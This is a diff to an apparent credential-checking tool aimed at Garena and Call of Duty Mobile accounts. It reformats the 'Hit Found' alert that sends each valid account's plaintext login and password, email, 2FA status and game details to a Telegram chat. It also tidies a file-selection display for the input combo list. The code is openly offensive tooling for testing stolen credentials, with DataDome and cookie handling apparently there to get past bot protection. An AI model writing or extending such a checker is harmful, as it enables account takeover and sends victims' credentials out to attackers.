@@ -1740,50 +1740,26 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                         _clean_tag = "✅ CLEAN" if details.get('is_clean') else "❌ NOT CLEAN"
                         _mobile_tag = "✅ Yes" if mobile and str(mobile).strip() else "❌ No"
                         _email_ver_tag = "✅ Yes" if email_verified_flag else "❌ No"
-
-                        _fb_connected = details.get('security', {}).get('facebook_connected', False)
-                        _fb_tag = "CONNECTED" if _fb_connected else "NOT CONNECTED"
-
-                        _bindings = ", ".join(details.get('binds', [])) or "None"
-
-                        _application = details.get('last_login_where', 'N/A')
-                        _last_login = details.get('last_login', 'Unknown')
-
                         _mention_str = f"\n👤 {_tg_mention}" if _tg_mention else ""
-
                         _tg_msg = (
-                            f"🎯 <b>Hit Found</b>{_mention_str}\n\n"
-
-                            f"🔐 <b>Account</b>\n"
-                            f"├ User: <code>{account}</code>\n"
-                            f"├ Pass: <code>{password}</code>\n"
-                            f"├ Status: <code>VALID</code>\n"
-                            f"└ Clean: <code>{'YES' if details.get('is_clean') else 'NO'}</code>\n\n"
-
-                            f"🎮 <b>Codm Info</b>\n"
-                            f"├ Nickname : <code>{codm_nickname}</code>\n"
-                            f"├ UID      : <code>{codm_uid}</code>\n"
-                            f"├ Level    : <code>{codm_level}</code>\n"
-                            f"├ Region   : <code>{codm_region}</code>\n"
-                            f"└ Shells   : <code>{shell}</code>\n\n"
-
-                            f"📧 <b>Account Info</b>\n"
-                            f"├ Email    : <code>{email}</code>\n"
-                            f"├ Phone    : <code>{mobile if mobile else 'N/A'}</code>\n"
-                            f"├ Country  : <code>{acc_country}</code>\n"
-                            f"├ Username : <code>{username}</code>\n"
-                            f"└ Garena   : <code>{garena_nickname}</code>\n\n"
-
-                            f"🔗 <b>Security</b>\n"
-                            f"├ Facebook   : <code>{_fb_tag}</code>\n"
-                            f"├ Bindings   : <code>{_bindings}</code>\n"
-                            f"├ Email Ver. : <code>{_email_ver_tag}</code>\n"
-                            f"├ Mobile     : <code>{_mobile_tag}</code>\n"
-                            f"├ 2FA        : <code>{two_step_enabled}</code>\n"
-                            f"├ Auth App   : <code>{authenticator_enabled}</code>\n"
-                            f"├ Last Login : <code>{_last_login}</code>\n"
-                            f"└ Application: <code>{_application}</code>\n\n"
-
+                            f"🎯 <b>HIT FOUND!</b>{_mention_str}\n"
+                            f"━━━━━━━━━━━━━━━━━━━━\n"
+                            f"🔑 <b>Login</b>: <code>{account}:{password}</code>\n"
+                            f"👤 <b>Username</b>: <code>{username}</code>\n"
+                            f"🐚 <b>Shells</b>: <code>{shell}</code>\n"
+                            f"🌍 <b>Country</b>: <code>{acc_country}</code>\n"
+                            f"━━━━━━━━━━━━━━━━━━━━\n"
+                            f"🎮 <b>CODM Nickname</b>: <code>{codm_nickname}</code>\n"
+                            f"🆔 <b>CODM UID</b>: <code>{codm_uid}</code>\n"
+                            f"⭐ <b>Level</b>: <code>{codm_level}</code>\n"
+                            f"🗺 <b>Region</b>: <code>{codm_region}</code>\n"
+                            f"━━━━━━━━━━━━━━━━━━━━\n"
+                            f"📧 <b>Email</b>: <code>{email}</code> ({email_ver})\n"
+                            f"📱 <b>Mobile</b>: {_mobile_tag}\n"
+                            f"✉️ <b>Email Verified</b>: {_email_ver_tag}\n"
+                            f"🔐 <b>Authenticator</b>: <code>{authenticator_enabled}</code>\n"
+                            f"🔒 <b>2FA</b>: <code>{two_step_enabled}</code>\n"
+                            f"━━━━━━━━━━━━━━━━━━━━\n"
                             f"🧹 <b>Status</b>: {_clean_tag}"
                         )
                         send_telegram_message(_tg_token, _tg_chat, _tg_msg)
@@ -2025,20 +2001,15 @@ def select_input_file():
     
     # Final selection display
     print()
-
-    # Pre-format values (avoids nested f-string bugs)
-    lines_formatted = f"{selected_file['lines']:,}"
-    lines_padding = ' ' * (40 - len(lines_formatted))
-
     print(f"{CYAN}╔{'═' * 50}╗{RESET}")
     print(f"{CYAN}║{RESET}  {GREEN}✔ SELECTED FILE{RESET}{' ' * 33}{CYAN}║{RESET}")
     print(f"{CYAN}╠{'═' * 50}╣{RESET}")
     print(f"{CYAN}║{RESET}  {WHITE}Name : {YELLOW}{selected_file['filename']:<40}{RESET} {CYAN}║{RESET}")
     print(f"{CYAN}║{RESET}  {WHITE}Size : {GREEN}{selected_file['size_display']:<40}{RESET} {CYAN}║{RESET}")
-    print(f"{CYAN}║{RESET}  {WHITE}Lines: {MAGENTA}{lines_formatted}{lines_padding}{RESET} {CYAN}║{RESET}")
+    print(f"{CYAN}║{RESET}  {WHITE}Lines: {MAGENTA}{selected_file['lines']:,}{' ' * (40 - len(f'{selected_file['lines']:,}'))}{RESET} {CYAN}║{RESET}")
     print(f"{CYAN}╚{'═' * 50}╝{RESET}")
     print()
-
+    
     return file_path
 
 import time
